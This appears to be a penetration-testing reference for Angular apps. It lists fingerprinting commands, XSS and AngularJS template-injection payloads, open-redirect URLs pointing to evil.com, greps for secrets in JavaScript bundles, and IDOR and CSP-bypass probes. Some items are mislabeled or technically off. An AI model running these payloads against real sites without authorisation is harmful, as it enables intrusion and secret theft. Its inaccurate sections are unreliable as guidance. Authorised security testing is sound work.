---
name: angular
description: Angular framework security testing - XSS, template injection, CSP bypass, prototype pollution, and client-side attacks
---

# Angular Framework Attacks

## Fingerprinting

### Identify Angular
```bash
# Check for Angular markers
curl -s https://target.com | grep -i "ng-version\|angular\|ng-app"

# Check JavaScript files
curl -s https://target.com/main.js | grep -i "angular\|ng-\|@angular"

# Check for Angular CLI build artifacts
curl -s https://target.com/runtime.js
curl -s https://target.com/polyfills.js
curl -s https://target.com/vendor.js
```

### Version Detection
```bash
# Angular version in HTML
curl -s https://target.com | grep -o 'ng-version="[0-9.]*"'

# Check package.json if exposed
curl -s https://target.com/package.json | jq '.dependencies["@angular/core"]'
```

## Common Vulnerabilities

### 1. XSS via Template Injection

**Bypass DomSanitizer**
```javascript
// Vulnerable: bypassSecurityTrustHtml
<div [innerHTML]="userInput | bypassSecurityTrustHtml"></div>

// Test payload
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Bypass DomSanitizer with bypassSecurityTrustStyle**
```javascript
// Vulnerable: CSS injection
<div [style]="userInput | bypassSecurityTrustStyle"></div>

// Test payload
background: url(javascript:alert(1))
```

**Bypass DomSanitizer with bypassSecurityTrustResourceUrl**
```javascript
// Vulnerable: iframe injection
<iframe [src]="userInput | bypassSecurityTrustResourceUrl"></iframe>

// Test payload
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### 2. Prototype Pollution

**Angular-specific vectors**
```javascript
// Test in browser console
angular.element(document.body).injector().get('$rootScope').__proto__.polluted = true

// Check if polluted
angular.element(document.body).injector().get('$rootScope').polluted
```

### 3. Client-Side Template Injection (CSTI)

**AngularJS (1.x) specific**
```javascript
// Test for CSTI
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
{{a='constructor';b=a;c=b('alert(1)');d=c();d()}}

// Bypass filters
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

### 4. Open Redirects

**Angular Router vulnerabilities**
```javascript
// Check for open redirect in routing
https://target.com/redirect?url=https://evil.com
https://target.com/#/redirect?url=https://evil.com

// Check for returnUrl parameter
https://target.com/login?returnUrl=https://evil.com
```

### 5. Sensitive Data Exposure

**Check for exposed data in client-side code**
```bash
# Search for API keys, tokens, secrets
curl -s https://target.com/main.js | grep -iE "(api[_-]?key|token|secret|password)" | head -20

# Check environment files
curl -s https://target.com/environment.js
curl -s https://target.com/assets/environment.json
```

### 6. Insecure Direct Object References (IDOR)

**Angular service vulnerabilities**
```javascript
// Check for IDOR in API calls
// Look for patterns like:
this.http.get(`/api/users/${userId}`)
this.http.get(`/api/orders/${orderId}`)

// Test with different IDs
curl https://target.com/api/users/1
curl https://target.com/api/users/2
curl https://target.com/api/users/admin
```

## Attack Techniques

### 1. CSP Bypass

**Angular-specific CSP bypass**
```javascript
// If CSP allows unsafe-eval
<script>
angular.module('app', [])
  .controller('MainCtrl', function($scope) {
    $scope.test = "alert(1)";
  });
</script>
<div ng-app="app" ng-controller="MainCtrl">
  {{$eval(test)}}
</div>
```

### 2. Route Hijacking

**Manipulate Angular Router**
```javascript
// In browser console
angular.element(document.body).injector().get('$location').path('/admin')

// Or with Angular (2+)
window.history.pushState({}, '', '/admin')
```

### 3. Service Worker Attacks

**Check for service worker vulnerabilities**
```bash
# Check if service worker exists
curl -s https://target.com/ngsw-worker.js
curl -s https://target.com/ngsw.json

# Check for cache poisoning
curl -s https://target.com/ngsw.json | jq '.assetGroups[].urls'
```

### 4. Dependency Confusion

**Check for vulnerable dependencies**
```bash
# Check package.json
curl -s https://target.com/package.json | jq '.dependencies'

# Look for known vulnerable packages
# - lodash < 4.17.21 (prototype pollution)
# - angular < 1.8.0 (XSS)
# - express < 4.17.3 (open redirect)
```

## Testing Checklist

- [ ] Identify Angular version
- [ ] Test for CSTI (AngularJS 1.x)
- [ ] Test DomSanitizer bypass methods
- [ ] Check for prototype pollution
- [ ] Test open redirects in routing
- [ ] Search for exposed secrets in client-side code
- [ ] Test IDOR in API endpoints
- [ ] Check CSP configuration
- [ ] Test service worker security
- [ ] Review dependencies for known CVEs

## Tools

```bash
# Retire.js for dependency scanning
retire --path /path/to/angular/app

# Nuclei templates for Angular
nuclei -u https://target.com -t ~/nuclei-templates/exposures/ -tags angular

# Custom Angular scanner
python3 -c "
import requests
import re

url = 'https://target.com'
response = requests.get(url)

# Check for Angular
if 'ng-version' in response.text or 'angular' in response.text.lower():
    print('[+] Angular detected')
    
    # Extract version
    version = re.search(r'ng-version=\"([0-9.]+)\"', response.text)
    if version:
        print(f'[+] Angular version: {version.group(1)}')
"
```
